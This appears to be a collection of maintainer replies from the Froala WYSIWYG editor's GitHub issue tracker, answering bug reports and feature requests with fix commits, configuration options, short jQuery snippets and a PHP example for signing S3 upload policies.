'formatBlock h5', 'formatBlock h6', 'formatBlock blockquote', 'formatBlock pre', 'strikeThrough'].\n. Yes, the URL isn't changed until OK button is hit. We won't change this behavior, because it doesn't make sense to open an URL that you insert.\n. Most probably yes. We'll do that as part of #196 \n. What browser are you using?\n. Please try the latest version from this repo and let us know if you still encounter the issue. We couldn't reproduce it at our end but it should be fixed.\n. We can't reproduce this and it should be fixed anyway in version 1.2.2.\n. We have already fixed the not focusing problem under development - we'll update it on this repo shortly today.\nThe editable.blur event will still happen on mouseup and after the focus of the input. That's because the editor looses focus when a dropdown is clicked for instance and it's not possible to use the default blur event from jQuery.\n. Fixed e2a5a90ab3ce30fb782c0fc08a2436ad887d592e\n. It's same thing. We'll fix it during today and update it here.\n. e1a1109f0a333eb4de401ca1a42ed5e07c6b4bcf Fixes it.\n. The jquery.event.drag has a not option which defines what elements on the page drag doesn't apply to. If you set that option to .froala-box *, .froala-editor * it works very well. From my point of view, jquery.event.drag is not implemented right because by default it prevents clicking on all elements from the page except input tags.\n. We don't accept pull requests on this repo. However, we'll make the changes at our end and update that link. Thank you!\n. 242624d7648611000b9758384e3ca8cbc814e946 still uses mouseup but simulates click.\n. ee90e70aecec3df768994ec415fb737a7377e73a adds in beautifyCode option that you can set to false so that Froala Editor doesn't format the source code.\n. It's because of how mobile Safari works - there is no workaround to make that cursor not show there.\n. If you want that you can simply include the fonts you need and then update the fontList option http://editor.froala.com/options#fontList\n. The getHTML method returns the html.\nWe use this repository for bug tracking and not for support. Please use it appropiate.\n. Thanks for letting us know about it. ee90e70aecec3df768994ec415fb737a7377e73a fixes it.\n. Haha! This made my day!\n. 554c59002feb502871dd3407f83ab9234a9324f5 fixes it.\n. 5e55ff4eda4029db976c4c60dddb821ead76904e adds imageTitle option.\n. 9626137c353e6842fcdff50fd14d849b5f61067d updates to the colors plugin. The colors can be set using the option colors and the break between colors using the option colorsStep.\n. Fixed 027dda9f50604c8a434a9801ebaeee4697d9bb0a\n. That is already done and has been included in the 1.2.2 release too. (Allow undo/redo without buttons - http://editor.froala.com/changelog#1.2.2). The undo/redo shortcuts are enabled by default and they cannot be turned off.\n. No, we don't have such yet. But it's a good suggestion. We'll make sure it gets added in. :)\n. We'll do that in a further release together with table resize abilities.\n. I am closing this since it will be part of the new table tool we'll release during April.\n. Fixed on ffbcd089a750ae648712d9d53cd66c16837f69de. There was a problem with the order of table/lists plugin inclusion.\n. Fixed ffbcd089a750ae648712d9d53cd66c16837f69de\n. b3988c218811b820dd72f3e99346ae9195e0d625 fixes it.\n. Version 1.2.3 will not have that anymore.\n. Done ea95abd617495330e1ce3c58c437fe4314ade70c. Here are few notes:\n- froala_content.css contains the minimal CSS style to display the images, videos and few other elements edited with the editor on the page where the editor is not initialized. Including froala_editor.css file has the same effect, but we decided to create this separate file for users who want to include only a small file.\n- froala_style.css contains some additional CSS where the style of the elements inside the editor is set up, about the same with froala_page.css\n. That happens only in Webkit browsers and is the way Webkit browsers work. We checked this over an over again some time ago and there is no way to change that.\n. It is not possible to detect properly if a tag can be toggled on/off. Unfortunately, at this point we're limited on doing anything for this because of the way browsers work.\n. You have to upgrade to version 1.2.2.\n. Have you updated the video plugin too?\n. Please paste here the code you're trying to insert.\n. In the embedded code it is supposed to paste only the video code (as you get from Youtube or Video), not other tags too. It works as it should and the video is embedded correctly. You can try that on our website.\n. If you insert the following code it gets inserted as it should. If you believe it doesn't please details what doesn't work correctly.\nhtml\n<embed height=\"360\" type=\"application/x-shockwave-flash\" width=\"480\" src=\"http://vimeo.com/moogaloop.swf?clip_id=4936730&amp;server=vimeo.com&amp;show_title=1&amp;show_byline=1&amp;show_portrait=0&amp;color=00ADEF&amp;fullscreen=1\" allowscriptaccess=\"always\" allowfullscreen=\"true\"></embed>\n. OK. Now it makes sense. The <embed> tag is stripped when the content is saved or when you switch to HTML view. We'll fix it. \nThank you for all the information!\n. ad91497e3cdd310261fdb214ccd58c648ee8db84 fixes it.\n. 5a560637d31727f3fd24476593d439353f162d89 changes it so that if you set defaultImageWidth: 0 it won't add the width attribute anymore.\n. We don't merge pull requests directly here, but we'll update the Russian language with your suggestions. Thank you for it! :+1: \nWe are using encoding because there still are users using old browsers, like IE8.\n. $(selector).editable('triggerEvent', 'contentChanged', []); should work.\nPlease notice that we use this repository mainly as a bug tracker and not for support (http://editor.froala.com/contact). Thank you!\n. Autosave is not related to this event. We'll investigate but autosave\nsimply checks the last content sent to be saved and if it is different then\na request is made.\nOn Oct 8, 2014 10:31 PM, \"kenxle\" notifications@github.com wrote:\n\nThanks for the quick response.

We'll make a release shortly that will include this fix too.\n. The Android issue is different than the desktop one. We just fixed it under development few minutes ago and we'll update the code here shortly after we run some more tests.\n. Probably you're doing something wrong. You'll get that message when the JS file is not included. \n. @thomas-boll If you get this error, then it is most likely because you're including the editor JS files after initializing the instance. The JS files should be included before initializing the editor.\n@echazen If you have a license for the editor that includes support, you can contact us at anytime through our website.\n. Is that happening on the master version from this repo too?\n. It should be fixed on the master branch (v1.2.3). Please give it a try and let me know.\n. Are you using the last version from this repo?\n. OK. But is the version that is now on the master branch? Because we did some updates for that at the end of the last week. \n. Please send us the document you're using to copy from together with info about what OS and browser you're using.\n. It doesn't matter the text, but the document you're using to copy the text from.

There is already removeFormat http://editor.froala.com/methods#removeFormat method available that can be used with a custom button. This is the first time someone asks for this feature - if there will be further requests we may add it.\n. We included it in bd903d54407c6602fe035a408e161cdaf47ab6a3\n. The editor has 2 methods enable and disable that do exactly that. They are not documented yet because they were experimental until version 1.2.3.\n. 3d85921f9ab7ed1948b3e0c6d1329f1bce7065e9 should fix it. Make sure that you update the CSS too.

This is fixed in the version 1.2.3 (master branch of this repo). We will release this new version today and it will be updated on our website too.\n. What device are you using? iPhone/iPad?\n. I just tested on iPad with iOS 8 and the inline editor appears (see attached screenshot).\n\nOn iPhone it is designed not to appear because the screen is too small.\n\n. OK. So it doesn't work on iOS 7 on iPad. We'll fix it, thank you for reporting it.\n. 9370653f2ae8e4c26677b2d7b3db04c30e77a7ec fixes it.\n. The editor is designed not to allow empty tags in order to keep the HTML output as clean as possible. If you want to use empty tags then you'd have to add a zero width space into your tags http://www.fileformat.info/info/unicode/char/200B/index.htm.\n. There is no option for that. However, you could override the wrapTextInElement method to change that.\n. @julieushpa the initial comment was for V1 of the editor and many things have changed since then. However, if you'd use the master version (866fd83e724e1b505a487f28dd4175e882528cbb), then all you should do is to add the contenteditable attribute: <div style=\"clear:both\" contenteditable=\"false\"></div>.\n. Done 55d9757b39974e5aaea778fc7a8c2aae1db1de3c\n. We discussed a lot about what buttons to put there in the toolbar by default and the current ones were our top option. If you want it differently, you could easily do that by overriding $.Editable.DEFAULTS.buttons and so you won't have to recreate the entire button bar.\nOne important criteria that we had on the list when we decided this was to have a nice toolbar for the inline editor when all plugins are included.\n. No, there is not and there is no reason to have something like this in docs. Each user may do this as he needs. I only proposed a posible solution, not something that everyone using file upload should do.\n. 948cc0fd05a3e641d2c31bf7edf450831be15bf7 fixes it. Thank you!\n. Actually there is such feature already. You should read the documentation a bit more carefully.\nhttp://editor.froala.com/server-integrations/php-delete-image\nhttp://editor.froala.com/server-integrations/php-media-manager\n. Added in v2.0.0-rc.1 as file.unlink.\n. @sanwinthetaung no, please request one here: https://wysiwyg-editor-roadmap.froala.com/public. You can change the tags allowed by using allowedTags option http://editor.froala.com/options#allowedTags.\nIMNSHO, I would recommend to avoid allowing the users to change the content of the head directly with the editor. That's because most of the users don't know what information should go there or they use them inappropriate. Instead, you could make other inputs where the users enter the Title or Description and then build yourself the head tag.\n. Last commit introduced a new option fullPage that allows tags such as <HTML>, <HEAD>, <BODY> when the option is enabled.\n. Can you replicate that on our website?\n. I can't replicate it. Please make a recording and send it to us.\n. I can't replicate it. Please make a recording highlighting your issue. We want to fix it only that we can't replicate the issue at our end.\n. Could you send us a link to the page where you're using it? If you don't want to put it public here, you could send it to me on stefan@froala.com.\n. It seems to me that there is a problem with how you insert that list item and not a problem with the editor.  Please contact us via the contact form from our website to discuss more about it. \n. 1fabc09ca945696c0fabdec162101322438aea84 fixes it.\n. Duplicate of #255. Please do not open new issues for the same thing.\n. 1fabc09ca945696c0fabdec162101322438aea84 fixes it. Thanks for letting us know about it!\n. I just checked and the HTTP headers are set properly. If you pass headers when you initialize the editor, they will appear in all requests that are made. Could you send us a link to the page where you're using it? If you have private data, you could email us and not post the link here.\n. How are you setting the headers?\n. Yes. The fr-tag is intended to keep the style outside of the editable area, when you display the content, according to the CSS rules defined in https://github.com/froala/wysiwyg-editor/blob/master/css/froala_style.css\n. Consider the following situation. You initialize the editor on a textarea, you write the content and then you want to display it on another page and of course you expect it to look identical. In order to keep the style of the elements, there are 2 options:\n1. The one we used by adding the fr-tag class.\n2. Don't add a class for the blocks inside, but put the content in a div for instance and apply the same style to the elements inside.\nIf you believe there is another solution I'm happy to hear it.\n. We're building a WYSIWYG editor which means that what you edit should be the same with what you'll see. We decided that this is the best approach and if you don't want those classes you could easily remove them using a regular expression.\n. The latest version has a new event called getHTML. That can be used to change the HTML that you get and this way the fr-tag class can be removed easily. See https://github.com/froala/wysiwyg-editor/blob/master/examples/events/getHTML.html.\n. We'll probably add an option for removing fr-tag because they are repetitive and other alternatives might be preferred by some users, but other classes such as fr-fil, fr-fin, fr-fir will be kept because they are used to align images and display them according. Inline style could be used as well to format images, but it's not SEO friendly and would get the editor in a wrong direction.\n. 40538a2d944094fc571d66be3a040ab508f410dc doesn't add fr-tag by default anymore. However: \n- fr-tag is added if useFrTag option is set true\n- wrapping the output in a tag with class froala-view would have the same effect\n. If you use getHTML and pass the param add_fr_tag it would override the useFrTag option.\n. @michaelGregoire could you try with the last commit and let me know if you still have the problem?\n. 1) We'll check.\n2) It is already fixes on the master version.\n. What browser and OS are you using?\n. What OS? What Chrome version?\n. Right. 5447c36a4df186ea71f5300e03616441c1bbb63d fixes it.\n. 3d67df69a40a9c6e6c9a90ee0c574edf23aedebd fixes it.\n. Could you please test on the latest version from this repo and let me know if you still have the issue? We could not reproduce it, but we made some changes that might have fixed it.\n. Please let us know the browser and operating system that you are using. \n. I saw it even if I haven't put a comment.\n. We just tested the master version in Google Chrome on Windows 8.1 and there is no problem.\n. We tested on the example from our website (which is version 1.2.4 RC) and on the master version which has couple more fixes. If you can provide a link to a page where this is happening to you we'd be happy to look over it.\n. We tested in IE 11 too and there is no problem. If the issue is not replicable on our website most probably you have something at your end CSS/JS that interferes with Froala Editor and creates that issue.\n. I'm closing this because we don't accept feature requests on Github anymore.\n. Yes, we're adding Aviary just in the next release and update is already on Github: https://github.com/froala/wysiwyg-editor/blob/master/html/3rd-party/aviary/index.html.. Added in v2.0.0-rc.1\n. Only images can be browsed for the moment. You can find an example about how to use tags on https://www.froala.com/wysiwyg-editor/v2.0/docs/concepts/image-manager.\n. You're using the Desktop app or you're using Evernote in browser? I just tested the Evernote in browser and it works fine.\n. OK. We'll investigate it shortly.\n. The issue is fixed on the master version from Github.\n. The editor pastes the HTML fine. This is how it is on the note from Evernote, but on Evernote they have some CSS rules that make the additional bullet not to appear (IMO, they are doing it wrong because it's possible to make it look like that without additional style).\nIf you want to support paste from Evernote, you should consider using the onPaste event (https://editor.froala.com/events#onPaste) and the other pasteEvents and clean the HTML. There is not a considerable number of people using Evernote (like in case of Word) so that we do additional cleaning specially for Evernote by default.\n. I managed to reproduce it. It's not related to the Kube framework. We'll fix shortly.\n. Sorry, I was wrong. I can't reproduce the issue. Please make a jsFiddle or send us a link to a page where we can reproduce the issue.\n. ccbe383af31404d8cd168666ca51f9f5cac3a857 Fixes it.\n. Please check the master version and let me know if the issues are gone.\n. 91f2eff0626f32ad7b7461170a9b43325f8dbf3c should fix it. Nice catch! :+1: \n. Yes, we implemented it like this for consistency. If you have a <h2> and then you want to make a list from it, you expect the <h2> to remain inside the list. Same things is happening for <p>.\nYou could use some CSS if you want the <p> inside the <li> to look different.\n. We decided to remove p inside li. 3bedb5a508fc914184534980380f01d249547816 does that.\n. That was updated in version 1.2.5 which is still under development. We update plugins only when we do the official release.\n. Please send the instructions to replicate this.\n. In your code, there is class=\"piframe-left;\" which should be class=\"piframe-left\". The problem is not from the editor.\n. Try b17743cc9f4a4c52ae0b996dc0670e08ec5cb76c. It's hard for me to replicate this at my end. Could you provide a link where we can test or a jsFiddle?\n. Hi @jimmyon! Is that happening on the master version? If so, could you please make a jsfiddle?\n. @Smashr last commit should fix it.\n. You can use:\nhtml\n<div>editable</div>\n<div contenteditable=\"false\">not editable</div>\n<div>editable</div>\n. We can't replicate it. Can you replicate it on http://editor.froala.com?\n. We can't replicate that. If you can provide enough details so that we can reproduce it or you can provide a video highlighting the issue, we can look into it. \n. Please send us the document you're copying from.\n. I saw the issue in the video but we need the document you're copying from to reproduce it. If you want this fixed please collaborate with us.\n.

I don't see any link to a document.\n. We've just checked with the document you sent with the master version and the pasted list was never pasted as nested list.\n. There is no such event. Actually, it might prove very difficult to find that because new paragraphs are added by the browser. \n\nI don't see any situation when you'd need that. Could you please let me know why you need such event, maybe I can tell you an alternative.\n. That would be the right way to handle this.\n. @mtuan94 you could listen to the keydown event like this and take the editor content before enter.\n``js\n$(selector).on('froalaEditor.initialized', function (e, editor) {\n  editor.events.on('keydown', function (e, editor) {\n    // editor.$el.html()\n  }, true);\n});. Thank you for your help. We don't merge PRs directly, but we included your suggestions in the latest release https://github.com/froala/wysiwyg-editor/releases/tag/1.2.4.\n. 02c01086f16e2165bc00b67d090697ed32c2f198 fixes it.\n. This feature is already on our list. The simple way to do it now would be to set adata-captionwith the same value astitleand then use anafter` property for image to display it.\n. One of our customers created a plugin for that https://github.com/Streetwise-Media/Froala-Image-Caption\n. Yes, it will be in the following months. Sorry to keep all you guys waiting.. Just a quick update here. The last commit is adding image caption feature. . We asked you kindly several times to give more details on the issues you open. Again, you're not providing enough details. If you don't provide enough details on further issues we'll simply close the issues without trying to test them.\nHowever, we tried to replicate the issue you reported. It seems to happen when the editor is empty and you paste a list from Word for instance. This happens because in IE9 <p><br/><p> is interpreted different than in the other browsers and creates some empty white space. This is a wontfix issue and it will remain like this.\n. Yes. In certain situations it might appear at the top. As I said in the previous email, this happens because in IE9 <p><br/><p> is interpreted different than in the other browsers and creates some empty white space. This is a wontfix issue and it will remain like this.\n. Thank you for your help. We don't merge PRs directly, but we included your suggestions in the latest release https://github.com/froala/wysiwyg-editor/releases/tag/1.2.4.\n. It should be fixed on the master version.\n. This is the price for having image move to work fine in all browsers. Unfortunately, it's the only way to make image move to work on all browsers and make sure it doesn't break the HTML. For the moment it will remain like this. \nThe image is placed where the cursor is and if you play with it for a while you start to get used. If you'll check other editors, you'll find the Froala is the only one in which is possible to move image in all browsers (Firefox, Chrome, Safari, IE).\n. What Android version are you using?\n. Could you also please let me know the device, too?\n. I just checked and I can confirm it. It is happening because of the autocomplete.. somehow the browser doesn't get the keyup/keydown events while autocomplete is active. \nI'll mark this as bug and we'll investigate it further, but it might be a wont fix issue.\n. Fixed 60b2f45db6c49f822ca6f0dc4a65cb1f823e880c\n. We'll review it.\n. 26665868228e52aecac39166f85b77d1dc8d275e fixes it.\n. We updated it. Thank you!\n. I couldn't get this happen. Could you send a document explaining what exactly you copy? Also, what browser are you trying it on?\n. @mwtorkowski Could you send a document explaining what exactly you copy?

For the moment this is a wontfix. In version 2.0.0 we might redesign that.\n. Fixed 8da68a57e1cec6b939caf141ab6045d1ebd64a08\n. Nice catch. :+1: We'll fix it shortly.\n. Fixed 8da68a57e1cec6b939caf141ab6045d1ebd64a08\n. It is fixed on the master version here on Github. It is not updated yet on our website.\n. We don't merge PR directly from here, but we have updated it. https://github.com/froala/wysiwyg-editor/blob/master/js/langs/uk.js\nThank you a lot!\n. Please read https://github.com/froala/wysiwyg-editor/issues/254#issuecomment-60522862. \nI don't believe there is an issue, but if you send us the code you paste we can check it further. Also, make sure that you use the latest version.\n. We don't merge PR directly in this repo because of the way the code for this repo is built. However, we updated the repo with your suggestions. https://github.com/froala/wysiwyg-editor/blob/master/js/langs/nb.js\nThank you a bunch!\n. As I said before, the issue is fixed on the master version on Github, but it is not updated on our website yet.\n. Nice catch :+1:. We'll fix it shortly.\n. 4e39d529b58ca80ae7cd98757810e013b432a00e fixes it.\n. After initialization, you can use some JS to change the toolbar position by moving it from before the editable area to after it. For popups, it might work if you use some JS to set a negative margin-top for them equal with the popups height. \nAnyway, I find it a bit unusual to have the toolbar at the bottom and open popups above instead of below. The entire web is designed this way so doing it differently might be awkward for users. \nAlso, we use this repo as a bug tracker mainly so please read the README (https://github.com/froala/wysiwyg-editor#reporting-issues) and use it appropriate. \n. I created #326 and marked it as feature-request. If there will be interest for such a feature, we'll add it.\n. Selecting the image file and pasting it in the editor is not possible because of the way the browsers handle the clipboard. However, that error should not appear and we already fixed it couple of days ago.\n. We'll check paste from Word.\n. It works if you select the image in Word and copy it. \nHowever, it doesn't work when you select text together with image and copy it. There are clipboard limitations that doesn't permit to copy it.\n. This is one of the reasons why we put there a defaultImageWidth and it is set to 300 by default. Because of the way tables work, it is not possible to limit the image size to the width of the cell. There is a rule in CSS max-width: 100% set for images, but as I said inside tables that rule takes the full table width instead of table cell.\n. 4e39d529b58ca80ae7cd98757810e013b432a00e adds in multiLine option. \n. Added in v2.0.0-rc.1.\n. Indeed, the issue is there when you try to upload a file and not an image. Thanks for letting us know about it.\n. 4e39d529b58ca80ae7cd98757810e013b432a00e fixes it.\n. Added 590ed87eb0fc626090e9f7b2befb2f1fb547a15a\n. You can see what options are set to upload to i.froala.com using $.Editable.DEFAULTS in console. \nPlease note that we use this repo for bug tracking, not for support. You should use https://editor.froala.com/contact.\n. 4e39d529b58ca80ae7cd98757810e013b432a00e adds in showNextToCursor option. If you set it to false, the popup will appear as you suggested.\n. Actually CMD + F is used by the editor to show it when inline mode is used. Just remove show from shortcutsAvailable and CMD + F will be browser default. https://editor.froala.com/options#shortcutsAvailable\n. It is self-explanatory but a jsFiddle would help us to get it fixed sooner.\n. Sure http://jsfiddle.net/7eu9190a/. It's version 1.2.4 and not the one from here but it should be OK.\n. https://github.com/froala/wysiwyg-editor/blob/master/examples/scrollable_container.html\n. Fixed.\n. Sorry, I believe we missed an update. Please try b46df3fd524b9ac9a1f443d74d417bf67d3a55e9.\n. @jsilve that's because we moved some things around. See here: https://github.com/froala/wysiwyg-editor/blob/master/html/misc/scrollable_container.html.. Nice catch. We'll investigate it further :+1: \n. 96d983d513bc2dfeb868cb053f8a599063ef3546 fixes it.\n. Are you using the master version?

Custom buttons are passed as an option when the editor is initialized and the icons option as well. Documentation doesn't mention that, but icons cannot be changed after the editor was initialized.\n\nCould you please explain why would you need to change the icon of a custom button?\n. It's a mistake in docs, the icons option cannot be changed after initialization. I would recommend to do like this when the task starts/stops: this.$editor.find('button[data-name=\"your_button_name\"] i').toggleClass('fa-spin')\n.

If the issue is not reproducible on our demo page then there is not an issue from the editor. We use this repo for bug reporting so please use it appropriate. Support is offered through https://editor.froala.com/contact to users who have a license that includes support.\n. Please let us know what browser and OS are you using so that we can check it.

What Windows version?\nBy jsFiddle I mean create an example on http://jsfiddle.net that has the issue you explained.\n. That part of the HTML is for including some special script to support IE8.

We had several complaints about the media manager button not being suggestive and hard to find. We'll probably move it from there to a button in the toolbar or at the top of the insert image popup. \nWe have in plan a lot of improvements for the media manager (search included) and they will come in the 2nd part of 2015 most probably. I am closing this issue for now.\n. It is explained on https://editor.froala.com/examples/color-themes how to use the theme file.

The response param will contain the original response from the server that you can parse and use it further.\nSame for imageReplaced (https://editor.froala.com/events#imageReplaced) event.\n. Sorry, it is not possible.\n. It's not built-in the editor, but you can now change it easily:\njs\n$(selector).on('froalaEditor.initialized', function (e, editor) {\n    var old_enter = editor.cursor.enter;\n    editor.cursor.enter = function (shift) {\n        return old_enter(!shift);\n    }\n}).froalaEditor();\n. @imparvez see https://github.com/froala/react-froala-wysiwyg#events-and-methods..

We're working on improving the way tags are cleaned so that list would work fine even in this case. Probably there will be few days until we get an update for that.\n. How have you got to it in Safari? We tried (Firefox, Chrome and Safari), but couldn't get to that.\n. Sorry, I believe I was not clear enough. How have you got to that HTML starting from a blank editor?\n. Sorry, it is not closed.\n. Fixed 2d022a08f678ac658136e720d64e263e30206c83.\n. What do you mean by is not working? We are using it in several places in editor and it works fine.\n. If can you make a jsFiddle to replicate it, then we'll check.\n. Indeed, it's an issue. We'll update shortly. Thanks for brining this into our attention.\n. Fixed 78cfc87d2dd4e81f805d675f350351ac6ae79562\n. Yes it works: http://jsfiddle.net/oLvndfo4/2/.\n. That's because you are not including the JS files correctly and jsFiddle is not loading them. http://jsfiddle.net/oLvndfo4/3/\n. No, the documentation is correct. sn is the start node and so is the start offset node inside the node. If you have <span id=\"sn\">12<span>3</span>45</span> and use sn = $('#sn').get(0) then so=1 will be the span inner span. http://jsfiddle.net/oLvndfo4/5/\nIn the jsFiddle you created there is only one node inside the <p> tag if you want to select text you have to use the text node inside it.\n. Yes, we have redesigned that and exec works a bit different. You have to use $(\"#edit\").editable(\"exec\", \"color\", \"red\", \"foreColor\");\n. Fixed 2d022a08f678ac658136e720d64e263e30206c83\n. Makes sense. We'll add an option for it.\n. 025c959d60803c8db44e358c6f7a284d9260250a adds an option called linkAutoPrefix.\n. Sorry, forgot about it. Please use 09136fd079d37a15609eda7d8e66e29370d811e7\n. It's not possible at this point to add more than one image on a single line. There will be an option in the future for that.\n. We implement minor features based on more things:\n- how many requests are there for them\n- if there are users who have purchased a license and request the feature than it has higher priority\n- how important we consider a feature is for the editor's users\nWe don't have an estimate for it. I marked it as feature-request for now.\n. 3495f3b4edda5b0f72340b4ac4496053f486a224 has a new dropdown in the image popup for choosing how to display the images. Now multiple images can be added on the same line if they have Text Wrap set to Inline.\n. You're probably returning a bad JSON. It's not an issue from the editor for sure. See https://editor.froala.com/concepts/image-upload for how you should implement it.\nPlease notice that we use this repo mainly for bug reporting and not for support.\n. Fixed 2d022a08f678ac658136e720d64e263e30206c83\n. Are you using the editor inside a <li> tag?\n. It is already fixed on the master from this repo. We update the Rails gem only when the official release is made. In the meanwhile you could include the files manually instead of using the gem.\n. Fixed 2d022a08f678ac658136e720d64e263e30206c83\n. Fixed 2d022a08f678ac658136e720d64e263e30206c83\n. We're using the placeholder attribute which is not available in IE 9. Taking into consideration that the number of users using IE 9 is reducing we'll not implement something specially for that.\n. We see a high interest for the possibility to preview video while editing, but we don't find any reason to do that. E.g. The user copies the video URL from Youtube, Vimeo, etc. and then he inserts it in the editor. Why would he be interested to see the video again (he already saw it)?\n. Last commit introduces the possibility to preview video while editing. First click on the video will show the edit popup. 2nd click on the video will do the default video actions.\n. Fixed 2d022a08f678ac658136e720d64e263e30206c83\n. @philfreo please update to 2d022a08f678ac658136e720d64e263e30206c83. You should use trackScroll option if you want not to hide the dropdowns when you scroll.\n@sudeste That is already on our TODO list, but there are still few items that have higher priority for the moment.\n. The option is already in the editor for a while now (https://editor.froala.com/options#trackScroll). Using that option reduces the performance of the editor a bit (specially on mobile devices) when there are more instances on the same page and that is why it is not enabled by default. If we'll find a way that doesn't affect too much the performance, then we'll add it by default for sure.\n. Are you using a different scroll than the page scroll? It doesn't hide the dropdown when I scroll.\n. OK. We'll try to find another way to handle this.\n. We're all out of ideas for this, so I will describe why the dropdown hides when you scroll maybe someone who follows this can provide some help.\nWe're listening to mouseup on window in order to hide the dropdown when you click outside of it. Unfortunately, hitting any scrollbar triggers the same event on the window and there doesn't seem to be any way to stop it. For the window we are setting a timer on scroll and if the timer is set when mouseup is triggered then it means that we did scroll and we don't have to hide the dropdown. Unfortunately, we can't do that for all the elements on the page because would result in a big overload.\n. That wouldn't work because when scrollableContainer is set to body, the scroll is on window and not body.\n. There is an article on our website that explains how to delete an image very easily https://editor.froala.com/concepts/delete-image.\nThe unminified js source code is available for Developer, Business and OEM licenses.\n. I could not replicate this. Please make a jsFiddle or provide more details.\n. Indeed this was an issue. We found it only in Webkit browsers. f554f64aece88c6ea0f9c2ee2f8afd6ae04bfa39 fixes it.\nThank you for letting us know about it!\n. How have you got to initialize the editor with that specific HTML?\n. If you want to remove the comments, you should use the option allowComments: false. By default it is set to true because there are a lot of users who want to allow comments.\n. No, it does what it should. There is some style inside the HTML that is set to the editor that changes the content outside of the editor. \nYou have 2 options: \n- do something similar to http://jsfiddle.net/2k0rpjz1/\n- use the editor within an iframe so that the style inside it is not affected by the style from the rest of the page\n. a), b) It does that based on what options that are passed. If you allow style tag style by default, then adding style in HTML mode might affect what is displayed as it is expected. As you can see in the jsFiddle from http://jsfiddle.net/2k0rpjz1/ it doesn't add the style if you don't include it in the allowedTags list. It would make sense to remove the style be default. We'll add that in.\nc) We are already working on an iframe option. However, it won't be available for sure until version 2.0.0.\n. See f53d4dbc3eeb4c60e813267a016eac1562a2519a. We haven't thought that there might be users who would input other bad <style> to break the rest of the page and haven't considered it an XSS so far. Now it is removed by default and that can't be changed.\nTurning allowComments off shouldn't be necessary anymore.\n. We have it fixed under dev. We have to run few more tests and will put the update here\n. Yes, it's fixed.\n. It was removed from the default list, it's a doc error. We'll check the base tag. Thanks!\n. It works as it should: http://jsfiddle.net/4ushg74q/. If you don't return false in the callback and just display the object, then it might be cleared from memory and that's why you see it empty.\n. The issue appears fixed in our tests. Closing this issue.\n. You're using an older version. It is already fixed on the master one.\n. Please use the below example in PHP as reference. We'll write an article about that during this week.\n``` php\n<?php\n// Set date timezone.\ndate_default_timezone_set('Europe/Bucharest');\n// important variables that will be used throughout this example\n$bucket = 'froala';\n$region = 's3';\n$keyStart = 'test/';\n$acl = 'public-read';\n// these can be found on your Account page, under Security Credentials > Access Keys\n$accessKeyId = '';\n$secret = '';\n$policy = base64_encode(json_encode(array(\n    // ISO 8601 - date('c'); generates uncompatible date, so better do it manually\n    'expiration' => date('Y-m-d\\TH:i:s.000\\Z', strtotime('+1 day')),\n    'conditions' => array(\n        array('bucket' => $bucket),\n        array('acl' => $acl),\n        array('success_action_status' => '201'),\n        array('x-requested-with' => 'xhr'),\n        array('starts-with', '$key', $keyStart),\n        array('starts-with', '$Content-Type', '') // accept all files\n    )\n)));\n$signature = base64_encode(hash_hmac('sha1', $policy, $secret, true));\n?>\nhtml\n\n\n\n\n<style>\n    body {\n        text-align: center;\n    }\n\n    section {\n        width: 80%;\n        margin: auto;\n        text-align: left;\n    }\n</style>\n\n\n\n\n\n\n      <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.

Sorry, we had to delay a bit the posting of the article. You should also set the CORS on AWS like this: https://gist.github.com/stefanneculai/deed108fad534d0db3ff#file-cors-file\n. $key and $Content-Type are strings not PHP variables. The example from master is fully working. You should make sure you set thedate_default_timezone_set,$accessKeyIdand$secret`. Also, you should set the CORS correctly on AWS: https://gist.githubusercontent.com/stefanneculai/deed108fad534d0db3ff/raw/a8829d697dcd7f90b934be61862c94cb97e69d50/CORS%2520file\n. What IE version are you using and what iOS version?\n. We have investigated this and it is a problem that Microsoft and Apple should fix. \nThere is already an issue opened for IE on https://connect.microsoft.com/IE/feedback/details/841043/blinking-text-cursor-overlapping-with-div. Most probably it will be fixed in the next version of IE according to the feedback.\nFor iOS, we have submitted this issue to Apple and we are currently waiting for feedback.\n. No, because you have to know where the focus is to see where the image is inserted. Same thing happens to dropdowns. If you would blur the editable area then you wouldn't see the selection anymore, which is not ideal.\n. Thanks for reporting it. It's fixed now.\n. This is the way it should have worked. There is an option for that default list https://editor.froala.com/options#defaultBlockStyle.\n. What browser and OS are you using?\n. What do you mean by \"example page\"?\n. Image move is not available for Safari under Windows because of some browser limitations.\nWe updated the example error.\n. Happens only when the cursor is not in the editor.\n. It's on our TODO list, but I can't tell you when we'll implement it.\n. Unfortunately, it's impossible to disable the iOS menu. Apple doesn't allow that.\n. https://editor.froala.com/options#useClasses converts image classes to inline style. Shoukd be what you're looking for.\n. You can use <div contenteditable=\"false\"></div>. \nWe're using this repo for bug tracking, not for questions. Please use https://editor.froala.com/contact for that. Thanks!\n. It shouldn't happen on the master version. Have you tried it?\n. There is a fix committed few days ago 3f376e1bd548c4d0f87c10b95ffddd4d847c7e0b.\n. We don't merge PR directly here, but I have added your suggestions. Thanks a bunch!\n. I tried that on the master version and on our website and it doesn't happen. Please make sure you use the latest version.\n. I checked again and indeed it seems to happen, BUT ONLY when the editor is empty.\n. Could you please make a jsFiddle?\n. The \"Unlicensed Froala Editor\" doesn't appear on localhost, that's why you don't see it. However that doesn't affect the way the editor works.\nI believe you have some other code that affects this somehow. Since that works on jsFiddle, I don't believe that the issues you're getting are related to the editor. If you could reproduce it on jsFiddle or send a link to your application we can investigate it further (if you don't want to put the link here you could contact us via http://editor.froala.com/contact as well).\n. Thanks. We'll investigate shortly.\n. If you can make a jsFiddle we can definitely check it.\n. Please make a jsFiddle.\n. You could use the onPaste event to remove the p tags: https://github.com/froala/wysiwyg-editor/blob/master/examples/events/onPaste.html\n. You're doing something wrong, that's why it doesn't work. We use this repo for bug tracking, not for offering support. For support you should use http://editor.froala.com/contact.\n. First of all, please read the README. We use this repo mainly for bug tracking and not for support.\nRegarding your question, you can add in your CSS a rule for .froala-element selector and set the font-family you want for it. If that font is also in the font family dropdown it will be selected when you use the dropdown.\n. Here you go http://www.w3schools.com/html/html5_video.asp\n. Actually, that is not an issue. New lines are replaced with accordingly with <br/> only when they are inside a <pre> tag. If you put in HTML new lines they won't be replaced with new lines. In textareas new lines work, but the editor is not designed that way.\nIf you want to have new line or space there, then you should replace \\n with either <br/> or &nbsp;.\n. Thanks for clarifying this. :-)\n. Please make a jsFiddle or provide a link where we can test.\n. Thanks for letting us know about that!\n. We don't have any plugin for emoticons. However, you could easily create one starting from the colors plugin.\n. With the last commit the editor won't get initialized anymore on Opera Mini. \n. There is no option to set the amazon Cloudfront domain. 